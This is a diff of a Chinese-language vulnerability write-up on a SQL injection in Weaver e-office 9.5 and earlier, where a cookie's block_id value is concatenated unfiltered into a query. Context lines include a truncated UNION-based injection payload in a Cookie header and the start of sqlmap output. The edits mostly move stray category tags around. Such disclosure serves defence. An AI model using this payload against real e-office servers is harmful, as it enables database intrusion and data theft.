@@ -20,14 +20,6 @@ e-office <=9.5
 
 # 漏洞分析
 
-深入探索
-
-客户关系管理
-
-脚本语言
-
-计算机安全
-
 general/new\_mytable/block\_content.php 业务逻辑如下
 
 ```
@@ -44,9 +36,15 @@ include_once( "general/new_mytable/content_list/content_".$block_type.".php" );
 ?>
 ```
 
-`$block_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
+深入探索
 
-编程
+计算机安全
+
+计算机科学
+
+网络
+
+`$block_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
 
 # 漏洞复现
 
@@ -60,9 +58,17 @@ Cookie: block_id=1 UNION ALL SELECT CONCAT(0x7162707a71,0x6572537871644b6d506862
 
 成功在响应回显测试payload
 
-[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
-
 编程
+
+深入探索
+
+计算机科学
+
+搜索引擎
+
+网络安全
+
+[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
 
 ```
 sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
